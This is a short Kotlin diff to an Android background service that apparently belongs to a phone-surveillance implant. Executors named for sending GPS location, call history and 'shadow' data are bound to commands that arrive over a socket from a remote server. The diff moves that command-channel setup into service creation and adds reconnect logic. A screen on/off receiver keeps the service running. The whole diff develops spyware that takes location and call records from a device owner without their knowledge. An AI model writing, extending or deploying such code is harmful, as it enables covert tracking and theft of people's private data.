@@ -28,6 +28,17 @@ class MainService : Service() {
         executors[GPS.SEND_GPS] = GPS(context = this)
         executors[Call.SEND_CALLING_HISTORY] = Call(context = this)
         executors[Shadow.SEND_SHADOW] = Shadow(context = this)
+        SocketConductor
+            .instance
+            .connect2Server(context = this)
+            .apply {
+                executors.forEach { map ->
+                    SocketConductor.instance.emmiter!!.on(map.key) {
+                        map.value.execute(it)
+                    }
+                }
+            }
+
     }
 
     override fun onBind(intent: Intent?): IBinder {
@@ -41,16 +52,9 @@ class MainService : Service() {
         val keepLiveReceiver = KeepLiveReceiver()
         this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_ON))
         this.registerReceiver(keepLiveReceiver, IntentFilter(Intent.ACTION_SCREEN_OFF))
-            SocketConductor
-                .instance
-                .connect2Server(context = this)
-
-            //add listeners to socket
-            executors.forEach { map ->
-                SocketConductor.instance.emmiter!!.on(map.key) {
-                    map.value.execute(it)
-                }
-            }
+        if (!SocketConductor.instance.socket!!.connected()) {
+            SocketConductor.instance.socket!!.connect()
+        }
         return super.onStartCommand(intent, flags, startId)
     }
 
